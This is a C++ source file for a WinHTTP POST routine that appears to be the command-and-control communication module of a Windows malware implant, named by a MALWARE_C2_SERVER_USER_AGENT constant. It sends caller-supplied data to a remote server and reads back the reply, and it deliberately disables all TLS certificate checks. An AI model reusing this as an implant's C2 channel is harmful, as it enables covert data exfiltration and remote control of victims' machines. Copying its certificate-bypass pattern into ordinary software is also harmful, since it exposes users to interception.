#include <windows.h>
#include <winhttp.h>

#include "config.h"
#include "httpClient.h"

std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, std::wstring header_data, std::string request_data, bool useTLS)
{
    std::wstring result = L"";
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;
    BOOL bResult = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    DWORD flags;

    hSession = WinHttpOpen(MALWARE_C2_SERVER_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession)
    {
        // LOG(L"Session created\n");
        hConnect = WinHttpConnect(hSession, fqdn.c_str(), port, 0);
    }
    if (hConnect)
    {
        // LOG(L"Connection established\n");
        hRequest = WinHttpOpenRequest(hConnect, L"POST", uri.c_str(),
                                      NULL, NULL,
                                      NULL,
                                      WINHTTP_FLAG_BYPASS_PROXY_CACHE | (WINHTTP_FLAG_SECURE & useTLS));
    }

    /*allow insecure certs*/
    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        return L"error";
    }
    if (hRequest != NULL)
    {
        // LOG(L"Request open\n");
        bResult = WinHttpSendRequest(hRequest, header_data.c_str(), -1, (LPVOID)request_data.c_str(), request_data.length(), request_data.length(), 0);
        if (bResult)
        {
            // LOG(L"Request sent\n");
            bResult = WinHttpReceiveResponse(hRequest, NULL);
        }
        if (bResult)
        {
            // LOG(L"Response received\n");
            do
            {
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                {
                    break;
                }
                pszOutBuffer = new char[dwSize + 1];
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded))
                {
                    break;
                }
                wchar_t *tempString = new wchar_t[dwSize + 1];
                std::mbstowcs(tempString, pszOutBuffer, dwSize + 1);
                result.append(tempString);
                delete[] pszOutBuffer;
                delete[] tempString;
                if (!dwDownloaded)
                    break;
            } while (dwSize > 0);
        }
    }else{
        return L"error";
    }
    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);
    return result;
}
